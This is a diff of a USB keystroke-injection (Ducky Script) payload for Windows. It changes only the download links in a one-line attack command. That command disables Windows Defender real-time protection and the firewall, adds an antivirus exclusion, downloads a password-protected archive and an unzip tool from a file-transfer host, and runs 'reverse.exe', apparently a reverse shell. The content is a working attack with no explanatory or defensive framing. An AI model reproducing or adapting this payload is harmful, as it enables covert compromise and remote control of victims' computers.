@@ -14,7 +14,7 @@ STRING mkdir %temp%\opti
 ENTER
 DELAY 50
 REM DISABLE WINDOWS DEFENDER
-STRING powershell -Command Add-MpPreference -ExclusionPath "%TEMP%\opti" & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & netsh advfirewall set allprofiles state off & sc config WinDefend start= disabled & cd %temp%\opti & curl https://transfer/q5yoHm/reverse.zip -o reverse.zip & curl https://transfer/l64LVR/unzip.exe -o unzip.exe & unzip.exe e -y -P  %temp%\opti\reverse.zip & start reverse.exe
+STRING powershell -Command Add-MpPreference -ExclusionPath "%TEMP%\opti" & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & netsh advfirewall set allprofiles state off & sc config WinDefend start= disabled & cd %temp%\opti & curl https://transfer/eEmiF0/reverse.zip -o reverse.zip & curl https://transfer/bwGUuS/unzip.exe -o unzip.exe & unzip.exe e -y -P  %temp%\opti\reverse.zip & start reverse.exe
 ENTER
 DELAY 2500
 STRING exit
